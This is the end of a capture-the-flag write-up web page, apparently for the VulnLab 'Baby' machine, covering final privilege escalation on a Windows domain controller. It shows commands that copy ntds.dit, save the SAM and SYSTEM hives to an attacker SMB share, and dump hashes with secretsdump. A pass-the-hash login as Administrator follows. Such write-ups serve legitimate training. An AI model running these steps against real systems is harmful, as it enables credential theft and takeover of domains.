+<p>Once that's done, we can make a copy of the ntds.dit file using:</p>
+<div class="highlight"><pre><span></span><code><span class="go">robocopy /B F:\Windows\NTDS . ntds.dit</span>
+</code></pre></div>
+<p>Once that's copied, we can transfer it back over to the attacker machine. I set up an SMB server using <code>smbserver.py</code> for the transfer. </p>
+<p>On the target computer:</p>
+<div class="highlight"><pre><span></span><code><span class="go">net use \\attacker-address\share /user:&lt;USER&gt; &lt;PASSWORD&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; copy ntds.dit \\10.8.2.86\pwnshare\ntds.dit</span>
+</code></pre></div>
+<p>After we have the ntds.dit file copied over to our attacker machine, we need to grab the SAM and SYSTEM hives as well. </p>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; reg save HKLM\sam \\10.8.2.86\pwnshare\sam.sav</span>
+<span class="go">The operation completed successfully.</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; reg save HKLM\system \\10.8.2.86\pwnshare\system.sav</span>
+<span class="go">The operation completed successfully.</span>
+</code></pre></div>
+<p>Now that we have all these files on our attacker machine, we can run <code>secretsdump.py</code> to extract all the stored credentials.</p>
+<div class="highlight"><pre><span></span><code><span class="go">〉secretsdump.py -sam sam.sav -system system.sav -ntds ntds.dit LOCAL  </span>
+<span class="go">Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra  </span>
+
+<span class="go">[...SNIP...]</span>
+
+<span class="go">[*] Reading and decrypting hashes from ntds.dit    </span>
+<span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::  </span>
+
+<span class="go">[...SNIP...]</span>
+</code></pre></div>
+<p>Now that we have all the stored credentials, we can just grab the domain admin's NT hash and log in to get the final flag. </p>
+<div class="highlight"><pre><span></span><code><span class="go">〉nxc smb $ip -u &#39;Administrator&#39; -H &#39;[REDACTED]&#39;  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (sig  </span>
+<span class="go">ning:True) (SMBv1:False)  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [+] baby.vl\Administrator:[REDACTED] (Pwn3d!)</span>
+</code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+  
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+  <h2 id="__comments">Comments</h2>
+  <!-- Insert generated snippet here -->
+  <script src="https://giscus.app/client.js"
+        data-repo="tomfieber/tomfieber.github.io"
+        data-repo-id="R_kgDOPTkbBA"
+        data-category="General"
+        data-category-id="DIC_kwDOPTkbBM4Ctdzl"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate"
+        ? "transparent_dark"
+        : "light"
+
+      // Instruct Giscus to set theme
+      giscus.setAttribute("data-theme", theme) 
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+          // Instruct Giscus to change theme
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+        
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../28/vulnlab-manage.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: VulnLab: Manage">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                VulnLab: Manage
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../07/04/vulnlab-retro.html" class="md-footer__link md-footer__link--next" aria-label="Next: VulnLab: Retro">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                VulnLab: Retro
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright © 2025 Tom Fieber
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://x.com/tomfieber" target="_blank" rel="noopener" title="x.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M357.2 48h70.6L273.6 224.2 455 464H313L201.7 318.6 74.5 464H3.8l164.9-188.5L-5.2 48h145.6l100.5 132.9zm-24.8 373.8h39.1L119.1 88h-42z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discord.gg/XvAFFw6A" target="_blank" rel="noopener" title="discord.gg" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+        <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
+      
+        <script src="../../../../javascripts/tablesort.js"></script>
+      
+        <script src="../../../../javascripts/extra.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
